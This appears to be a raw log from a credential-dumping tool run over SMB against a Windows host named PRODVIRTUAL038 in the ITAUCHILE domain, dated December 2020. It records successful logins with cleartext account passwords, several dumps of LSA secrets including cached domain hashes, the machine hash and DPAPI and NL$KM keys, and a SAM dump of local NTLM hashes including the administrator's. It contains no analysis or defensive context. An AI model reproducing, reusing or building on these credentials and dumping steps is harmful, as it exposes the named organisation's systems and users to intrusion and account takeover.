12-22-2020 18:50:01 [*] PRODVIRTUAL038.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL038) (domain:ITAUCHILE)
12-22-2020 18:50:01 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:50:34 [*] PRODVIRTUAL038.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL038) (domain:ITAUCHILE)
12-22-2020 18:50:34 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:50:40 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:50:45 CRPA3260:e0e010db9abda6ac0f35fd73b3455090:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:46 CRPA3510:c5e605267dad00b2ebaa987c3a19c830:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:47 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:50:49 ITAUCHILE\PRODVIRTUAL038$:aad3b435b51404eeaad3b435b51404ee:698c98ce657dfb9df3e379f2e2892af3:::
12-22-2020 18:50:52 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:50:53 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 18:56:28 [*] PRODVIRTUAL038.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL038) (domain:ITAUCHILE)
12-22-2020 18:56:29 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:56:34 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:56:39 Administrador:500:aad3b435b51404eeaad3b435b51404ee:fbc7c67b399ee6d6d3b9ddd7b13db61e:::
12-22-2020 18:56:41 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:56:43 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:2a71ab9f6ac246b30ca61ecfc9f0ece6:::
12-22-2020 18:56:45 robotics:1004:aad3b435b51404eeaad3b435b51404ee:cac8aa946d31efa507c08661142a4c59:::
12-22-2020 18:59:24 [*] PRODVIRTUAL038.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL038) (domain:ITAUCHILE)
12-22-2020 18:59:24 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:59:30 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:59:35 CRPA3260:e0e010db9abda6ac0f35fd73b3455090:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:36 CRPA3510:c5e605267dad00b2ebaa987c3a19c830:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:37 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:39 ITAUCHILE\PRODVIRTUAL038$:aad3b435b51404eeaad3b435b51404ee:698c98ce657dfb9df3e379f2e2892af3:::
12-22-2020 18:59:42 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:59:43 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:06:55 [*] PRODVIRTUAL038.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL038) (domain:ITAUCHILE)
12-22-2020 21:06:56 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:07:01 [+] PRODVIRTUAL038.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:07:05 CRPA3260:e0e010db9abda6ac0f35fd73b3455090:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:06 CRPA3510:c5e605267dad00b2ebaa987c3a19c830:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:07 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:10 ITAUCHILE\PRODVIRTUAL038$:aad3b435b51404eeaad3b435b51404ee:698c98ce657dfb9df3e379f2e2892af3:::
12-22-2020 21:07:12 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:07:14 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
